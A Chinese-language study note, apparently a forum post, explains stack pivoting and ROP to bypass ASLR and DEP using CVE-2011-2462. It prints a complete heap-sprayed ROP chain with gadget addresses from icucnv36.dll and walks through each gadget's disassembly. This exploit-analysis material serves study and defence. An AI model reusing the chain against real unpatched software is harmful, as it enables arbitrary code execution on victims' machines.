
# [原创]利用stackpivot和ROP绕过ASLR+DEP学习笔记

## 概念

非栈溢出的情况下往往难以在栈上构造ROP链来绕过ASLR+DEP，而使用`stackpivot`技术可以解决这个问题，所谓`stackpivot`就是利用类似`xchg eax,esp`的指令使`esp`指向任意地址，配合C++的一些特性容易将`esp`指向自己的ROP链。

## 实例

CVE 2011-2462在`rt3d+14CAAD`执行任意代码

```
mov     eax, [ecx]  ; 取对象的虚函数表指针，而这个指针指向被释放的堆，记[ecx] = lpVtbl

push    1

push    0

push    0EBh

push    ecx

call    dword ptr [eax+1Ch]  ; 调用虚函数导致任意代码执行

test    eax, eax

setnz   al

retn
```

经过堆喷后可使`lpVtbl`如下：

```
lpVtbl+1C  4A8453C3  icucnv36.4A8453C3

...

lpVtbl+3C  0C0C0C0C

...

```

`0C0C0C0C`如下：

```
0C0C0C0C ==>    > 0C0C0C0C
0C0C0C0C+4      > 0C0C0C0C
0C0C0C0C+8      > 4A806F29  RETURN to icucnv36.4A806F29 from icucnv36.icu_3_6::UnicodeString::doCompare
0C0C0C0C+C      > 4A8A0000  ASCII "UTF-32"
0C0C0C0C+10     > 4A802196  icucnv36.4A802196
0C0C0C0C+14     > 4A801F90  icucnv36.4A801F90
0C0C0C0C+18     > 4A806F29  RETURN to icucnv36.4A806F29 from icucnv36.icu_3_6::UnicodeString::doCompare
0C0C0C0C+1C     > 4A806CEF  icucnv36.4A806CEF
0C0C0C0C+20     > 00000000
0C0C0C0C+24     > 00000000
0C0C0C0C+28     > 00000000
0C0C0C0C+2C     > 00000000
0C0C0C0C+30     > 00000000
0C0C0C0C+34     > 00000002
0C0C0C0C+38     > 00000102
0C0C0C0C+3C     > 4A806F29  RETURN to icucnv36.4A806F29 from icucnv36.icu_3_6::UnicodeString::doCompare
0C0C0C0C+40     > 00000000
0C0C0C0C+44     > 00000000
0C0C0C0C+48     > 00000000
0C0C0C0C+4C     > 00000000
0C0C0C0C+50     > 00000000
0C0C0C0C+54     > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+58     > 4A801F90  icucnv36.4A801F90
0C0C0C0C+5C     > 4A849038  <&KERNEL32.CreateFileMappingA>
0C0C0C0C+60     > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+64     > 00000000
0C0C0C0C+68     > 00000000
0C0C0C0C+6C     > 00000000
0C0C0C0C+70     > 00000000
0C0C0C0C+74     > 00000000
0C0C0C0C+78     > 4A8A0000  ASCII "UTF-32"
0C0C0C0C+7C     > 4A802196  icucnv36.4A802196
0C0C0C0C+80     > 4A801F90  icucnv36.4A801F90
0C0C0C0C+84     > 4A84903C  <&KERNEL32.CreateFileA>
0C0C0C0C+88     > 4A80B692  icucnv36.4A80B692
0C0C0C0C+8C     > 4A801064  icucnv36.4A801064
0C0C0C0C+90     > 00000000
0C0C0C0C+94     > 10000000  sqlite.10000000
0C0C0C0C+98     > 00000000
0C0C0C0C+9C     > 00000000
0C0C0C0C+A0     > 00000002
0C0C0C0C+A4     > 00000102
0C0C0C0C+A8     > 00000000
0C0C0C0C+AC     > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+B0     > 4A801064  icucnv36.4A801064
0C0C0C0C+B4     > 4A842DB2  icucnv36.4A842DB2
0C0C0C0C+B8     > 4A802AB1  icucnv36.4A802AB1
0C0C0C0C+BC     > 00000008
0C0C0C0C+C0     > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+C4     > 4A801F90  icucnv36.4A801F90
0C0C0C0C+C8     > 4A849038  <&KERNEL32.CreateFileMappingA>
0C0C0C0C+CC     > 4A80B692  icucnv36.4A80B692
0C0C0C0C+D0     > 4A801064  icucnv36.4A801064
0C0C0C0C+D4     > FFFFFFFF
0C0C0C0C+D8     > 00000000
0C0C0C0C+DC     > 00000040
0C0C0C0C+E0     > 00000000
0C0C0C0C+E4     > 00010000  UNICODE "ALLUSERSPROFILE=C:\Documents and Settings\All Users"
0C0C0C0C+E8     > 00000000
0C0C0C0C+EC     > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+F0     > 4A801064  icucnv36.4A801064
0C0C0C0C+F4     > 4A842DB2  icucnv36.4A842DB2
0C0C0C0C+F8     > 4A802AB1  icucnv36.4A802AB1
0C0C0C0C+FC     > 00000008
0C0C0C0C+100    > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+104    > 4A801F90  icucnv36.4A801F90
0C0C0C0C+108    > 4A849030  <&KERNEL32.MapViewOfFile>
0C0C0C0C+10C    > 4A80B692  icucnv36.4A80B692
0C0C0C0C+110    > 4A801064  icucnv36.4A801064
0C0C0C0C+114    > FFFFFFFF
0C0C0C0C+118    > 00000022
0C0C0C0C+11C    > 00000000
0C0C0C0C+120    > 00000000
0C0C0C0C+124    > 00010000  UNICODE "ALLUSERSPROFILE=C:\Documents and Settings\All Users"
0C0C0C0C+128    > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+12C    > 4A8A0004  ASCII "32"
0C0C0C0C+130    > 4A802196  icucnv36.4A802196
0C0C0C0C+134    > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+138    > 4A801064  icucnv36.4A801064
0C0C0C0C+13C    > 4A842DB2  icucnv36.4A842DB2
0C0C0C0C+140    > 4A802AB1  icucnv36.4A802AB1
0C0C0C0C+144    > 00000030
0C0C0C0C+148    > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+14C    > 4A801F90  icucnv36.4A801F90
0C0C0C0C+150    > 4A8A0004  ASCII "32"
0C0C0C0C+154    > 4A80A7D8  RETURN to icucnv36.4A80A7D8 from msvcr80.__timezone
0C0C0C0C+158    > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+15C    > 4A801064  icucnv36.4A801064
0C0C0C0C+160    > 4A842DB2  icucnv36.4A842DB2
0C0C0C0C+164    > 4A802AB1  icucnv36.4A802AB1
0C0C0C0C+168    > 00000020
0C0C0C0C+16C    > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+170    > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+174    > 4A801064  icucnv36.4A801064
0C0C0C0C+178    > 4A80AEDC  icucnv36.4A80AEDC
0C0C0C0C+17C    > 4A801F90  icucnv36.4A801F90
0C0C0C0C+180    > 00000034
0C0C0C0C+184    > 4A80D585  icucnv36.4A80D585
0C0C0C0C+188    > 4A8063A5  icucnv36.4A8063A5
0C0C0C0C+18C    > 4A801064  icucnv36.4A801064
0C0C0C0C+190    > 4A842DB2  icucnv36.4A842DB2
0C0C0C0C+194    > 4A802AB1  icucnv36.4A802AB1
0C0C0C0C+198    > 0000000A
0C0C0C0C+19C    > 4A80A8A6  icucnv36.4A80A8A6
0C0C0C0C+1A0    > 4A801F90  icucnv36.4A801F90
0C0C0C0C+1A4    > 4A849170  <&MSVCR80.memcpy>
0C0C0C0C+1A8    > 4A80B692  icucnv36.4A80B692
0C0C0C0C+1AC    > FFFFFFFF
0C0C0C0C+1B0    > FFFFFFFF
0C0C0C0C+1B4    > FFFFFFFF
0C0C0C0C+1B8    > 00001000
```

利用没有使用ASLR的`icucnv36.dll`（版本3.6.1.0）构造ROP链

`call dword ptr [eax+1Ch]`调用`icucnv36.4A8453C3`：

```
4A8453C3    8B48 3C         mov     ecx, dword ptr [eax+3C]  ; ecx = [eax+3C] = 0C0C0C0C
4A8453C6    8B01            mov     eax, dword ptr [ecx]  ; eax = [ecx] = 0C0C0C0C
4A8453C8    FF50 1C         call    dword ptr [eax+1C]  ; [eax+1C] = [0C0C0C0C+1C] = icucnv36.4A806CEF
```

调用`icucnv36.4A806CEF`：

```
4A806CEF    94              xchg    eax, esp  ; stackpivot, esp = 0C0C0C0C, eax = 0012EF00
4A806CF0    C0EB 02         shr     bl, 2
4A806CF3    32C0            xor     al, al
4A806CF5    5F              pop     edi  ; edi = [0C0C0C0C] = 0C0C0C0C
4A806CF6    5E              pop     esi  ; esi = [0C0C0C0C+4] = 0C0C0C0C
4A806CF7    C3              retn  ; RETURN to [0C0C0C0C+8] = icucnv36.4A806F29
```

返回到`icucnv36.4A806F29`

```
4A806F29    5F              pop     edi  ; edi = [0C0C0C0C+C] = icucnv36.4A8A0000
4A806F2A    5E              pop     esi  ; esi = [0C0C0C0C+10] = icucnv36.4A802196
4A806F2B    5D              pop     ebp  ; ebp = [0C0C0C0C+14] = icucnv36.4A801F90
4A806F2C    C2 1400         retn    14  ; RETURN to [0C0C0C0C+18] = icucnv36.4A806F29
```

返回到`icucnv36.4A806F29`

```
4A806F29    5F              pop     edi  ; edi = [0C0C0C0C+30] = 0
4A806F2A    5E              pop     esi  ; esi = [0C0C0C0C+34] = 2
4A806F2B    5D              pop     ebp  ; ebp = [0C0C0C0C+38] = 102
4A806F2C    C2 1400         retn    14  ; RETURN to [0C0C0C0C+3C] = icucnv36.4A806F29
```

返回到`icucnv36.4A806F29`

```
4A806F29    5F              pop     edi  ; edi = [0C0C0C0C+54] = icucnv36.4A80A8A6
4A806F2A    5E              pop     esi  ; esi = [0C0C0C0C+58] = icucnv36.4A801F90
4A806F2B    5D              pop     ebp  ; ebp = [0C0C0C0C+5C] = &KERNEL32.CreateFileMappingA
4A806F2C    C2 1400         retn    14  ; RETURN to [0C0C0C0C+60] = icucnv36.4A8063A5
```

返回到`icucnv36.4A8063A5`：

```
4A8063A5    59              pop     ecx  ; ecx = [0C0C0C0C+78] = icucnv36.4A8A0000
4A8063A6    C3              retn  ; RETURN to [0C0C0C0C+7C] = icucnv36.4A802196
```

返回到`icucnv36.4A802196`：

```
4A802196    8901            mov     dword ptr [ecx], eax  ; [ecx] = [4A8A0000] = eax = 0012EF00 
4A802198    C3              retn  ; RETURN to [0C0C0C0C+80] = icucnv36.4A801F90
```

返回到`icucnv36.4A801F90`：

```
4A801F90    58              pop     eax  ; eax = [0C0C0C0C+84] = &KERNEL32.CreateFileA
4A801F91    C3              retn  ; RETURN to [0C0C0C0C+88] = icucnv36.4A80B692
```

返回到`icucnv36.4A80B692`：

```
4A80B692  - FF20            jmp     dword ptr [eax]           ; JUMP to [eax] = kernel32.CreateFileA
```

跳转到`kernel32.CreateFileA`
